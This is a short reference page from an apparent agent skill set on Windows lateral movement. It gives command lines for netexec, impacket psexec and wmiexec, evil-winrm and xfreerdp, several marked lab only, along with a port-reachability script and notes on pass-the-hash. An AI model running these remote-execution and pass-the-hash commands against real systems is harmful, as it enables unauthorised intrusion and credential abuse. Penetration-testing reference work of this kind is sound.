# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`windows-lateral-movement`](SKILL.md) | Family: **Network, Active Directory and Endpoint**

Entry points verified against current releases. Impacket, Certipy and netexec rename subcommands between minor versions; check `--help` before scripting.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `netexec` | `netexec smb 10.20.30.20 -u Administrator -H <hash> --local-group Administrators` | Credential applicability and group check | Linux / Windows |
| `impacket-psexec` | `impacket-psexec corp.example/admin:pass@10.20.30.20` | Service-based execution, lab only | Linux / Windows |
| `impacket-wmiexec` | `impacket-wmiexec corp.example/admin:pass@10.20.30.20` | WMI process creation, lab only | Linux / Windows |
| `evil-winrm` | `evil-winrm -i 10.20.30.20 -u Administrator -H <hash>` | WinRM shell, lab only | Linux |
| `xfreerdp` | `xfreerdp /v:10.20.30.20 /u:Administrator /cert:ignore` | Interactive session, lab only | Linux / macOS |

## Minimal Lab Validation Script

Test credential applicability and protocol reachability, which is the part of the method that determines whether a path exists at all.

```python
import socket

HOSTS = ["10.20.30.20", "10.20.30.21"]
PORTS = {"smb": 445, "winrm": 5985, "rdp": 3389}

for host in HOSTS:
    open_ports = []
    for name, port in PORTS.items():
        sock = socket.socket()
        sock.settimeout(2)
        try:
            sock.connect((host, port))
            open_ports.append(name)
        except OSError:
            pass
        finally:
            sock.close()
    print(host, open_ports)
```

## Flag Notes

- `--local-group` reads group membership with the supplied credential, proving applicability rather than assuming it.
- `-H` takes an NTLM hash, which is the pass-the-hash form and needs no plaintext.
- `--reason` distinguishes filtered from closed, which changes whether a protocol branch exists.
